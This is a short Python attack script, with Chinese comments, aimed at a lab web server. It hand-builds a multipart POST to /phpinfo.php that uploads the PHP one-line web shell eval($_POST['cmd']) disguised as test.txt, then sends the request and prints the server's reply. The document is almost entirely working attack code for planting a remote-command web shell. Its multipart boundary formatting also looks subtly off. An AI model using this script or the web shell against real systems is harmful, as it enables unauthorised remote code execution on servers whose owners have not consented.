import socket

# ========== 这里改成你的靶场信息 ==========
TARGET_IP = "192.168.147.128"
TARGET_PORT = 8080
PATH = "/phpinfo.php"
# ===========================================

# 构造multipart，里面放一句话
boundary = b"----WebKitFormBoundaryABC123XYZ"
shell_data = b'<?php eval($_POST["cmd"]);?>'

body = (
    boundary + b"\r\n"
    b'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
    b'Content-Type: text/plain\r\n'
    b'\r\n'
    + shell_data + b'\r\n'
    + boundary + b"--\r\n"
)
body_len = len(body)

header = (
    f"POST {PATH} HTTP/1.1\r\n"
    f"Host: {TARGET_IP}\r\n"
    f"Content-Length: {body_len}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
).encode("utf-8")

packet = header + body

# 建立socket发包
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.sendall(packet)

# 接收全部返回
response = b""
while True:
    chunk = s.recv(2048)
    if not chunk:
        break
    response += chunk
s.close()

# 输出，errors="ignore"防止乱码报错
result_text = response.decode("utf-8", errors="ignore")
print("========= 返回内容 ==========")
print(result_text)